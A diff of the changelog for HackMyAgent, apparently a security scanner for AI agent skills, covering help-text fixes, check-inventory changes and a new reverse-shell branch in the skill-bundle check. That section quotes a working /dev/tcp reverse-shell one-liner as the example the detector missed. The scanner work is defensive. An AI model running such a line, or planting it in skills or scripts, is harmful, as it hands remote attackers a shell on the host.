@@ -4,6 +4,82 @@ All notable changes to HackMyAgent are documented in this file.
 
 ## [Unreleased]
 
+### `--json` is not deprecated, and the help strings stop saying it is
+
+From 0.8.0 through 0.32.0, `secure --help` described `--json` as deprecated
+(and `attack --help` called it a deprecated alias) while the README cited the
+flag throughout as the ordinary machine-output spelling. `--json` is not
+deprecated: it is shorthand for `--format json`, kept indefinitely. The
+`secure` and `attack` help strings, the #605 contradiction refusal and the
+source comments now say so. No flag is removed and no behaviour changes —
+same flags, same output, same exit codes.
+
+### A reverse shell in a skill's bundled scripts is now described by the bundle check
+
+`describeSkillBundlePayload` — the predicate behind the SKILL-006 finding over
+the files beside SKILL.md — recognised two shapes, both conjunctive: a curl/wget
+that reads a credential file into a remote request body, and a credential path
+with an exfiltration sink in the same statement. A reverse shell is neither.
+`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` in `scripts/recover.sh` names no
+credential and posts to no sink, so the one payload the skill actually ships ran
+past the check whose whole subject is the bundle — while the byte-identical line
+inside SKILL.md was reported CRITICAL.
+
+The predicate gains a third branch, and it reuses `SKILL_REVERSE_SHELL_PATTERNS`
+— the same six patterns the skill Markdown path already treats as sufficient on
+their own — rather than restating them, so the two paths cannot drift apart
+pattern by pattern. The list is exported for exactly that reason: the regression
+suite generates one case per element of the list, so a seventh pattern shipped
+with no bundled-script coverage fails the suite rather than passing it.
+
+Comments are unaffected. The `#`/`//` skip at the top of the predicate covers the
+new branch, so a `# bash -i >& /dev/tcp/...` line in a recovery runbook — and the
+shebang, skipped for the same reason it is not code — stays quiet.
+
+The bundle finding's description, message, fix and guidance now say "or opens a
+reverse shell" instead of naming exfiltration alone, and its per-file citation
+reads `opens a reverse shell via /dev/tcp/`. No check was added, no severity
+changed, and the skill Markdown path is untouched: a reverse shell in SKILL.md
+is still SKILL-008.
+
+### `explain` refuses unknown check IDs, and the inventory stops lying by omission (HMA-29)
+
+`explain NEMO-999` used to print the generic "Static analysis pattern
+finding." stub and exit 0 — every hyphenated unknown whose prefix had a
+category label got a confident non-answer with a green exit code. An ID
+outside the check inventory (the static explanations, the scan-soul
+governance catalog, and the taxonomy) now refuses on stderr, names the
+rejected ID, suggests the nearest known IDs (shared-prefix, then
+edit-distance neighbours), and exits 1. Every ID the CLI already explained
+still explains with exit 0.
+
+The inventory itself grew to match what `secure` actually emits: 24
+NanoMind semantic (AST) checks, 6 SOUL narrative checks, and the 8 SEM-MCP
+structural checks were reported in scan output but absent from
+`check-metadata` — `totalChecks` is now 362 (317 static · 45 semantic, 88
+categories). The deliberate holes the census measures are published in
+`check-metadata --json` under a new `exclusions` key naming the family,
+its IDs (or id pattern), and the reason: fix-application statuses,
+scan-status indicators, the Layer-3 coverage statement, the eval oracle's
+in-src test fixtures, the scan-soul governance control catalogue (still
+answered by `explain` via CONTROL_DEFS), per-run id families (ARP-*
+runtime-protection patterns, SEM-LLM-* narrative indices, red-team payload
+counters), and the inactive NanoMind daemon narrative families. A census
+test reads every emission shape in src/ — `checkId:` string literals,
+`PREFIX-${…}` templates, and a registered list of expression-valued sites
+(`ctrl.id`, `check.id`, `finding.id`, `r.payload.id`) — and fails when any
+emitted id is neither an inventory key nor declared-excluded, so the gap
+cannot regrow silently.
+
+`check-metadata --json` also gained a `severityNote`: severities are
+inventory defaults, semantic (AST/SEM) findings carry per-finding severity,
+and the fixed-severity sites (AST-MANIP-001, AST-HEARTBEAT-001,
+AST-INJECT-001 critical; AST-GOV-004, AST-PERSIST-001 high;
+SOUL-UNVERIFIABLE-CLAIM medium) are pinned so the table matches what
+`secure` emits. `explain` trims its argument before matching, refuses an
+empty ID with its own message, and its help example names IDs the command
+actually answers.
+
 ### `.hmaignore` gains `<path>:<CHECK-ID>`, trailing comments, `expires:`, and loud exit-neutral errors
 
 A path rule used to be all-or-nothing: `danger.py` removed every check on that
@@ -141,9 +217,10 @@ the default scan reporting the same false clean.
 
 **The detection vocabulary does not move.** No check was added, no severity
 changed, and no pattern was widened — this changes only which files the existing
-checks are given. The bundle finding fires on a conjunction (a credential file
-read into a remote request body, or a credential path and an exfiltration sink
-in the same statement), so an ordinary bundled installer stays quiet: every
+checks are given. As of this change the bundle finding fired on a conjunction
+only (a credential file read into a remote request body, or a credential path
+and an exfiltration sink in the same statement) — the reverse-shell branch is a
+later change, described above — so an ordinary bundled installer stays quiet: every
 committed fixture in the tree, and the repository's own self-scan, produce a
 byte-identical finding set before and after.
 
@@ -426,7 +503,7 @@ their em dash (`fix-all --with-aim`, `opena2a protect .`,
 
 ### A contradiction between --json and --format is named, not resolved silently
 
-`--json` is the deprecated alias of `--format json`. Given together with a
+`--json` is shorthand for `--format json`. Given together with a
 different format — `secure --ci --json --format sarif` — the alias won
 silently: the json report printed at exit 0 and nothing said the requested
 format was discarded. Both commands that carry the two flags (`secure` and
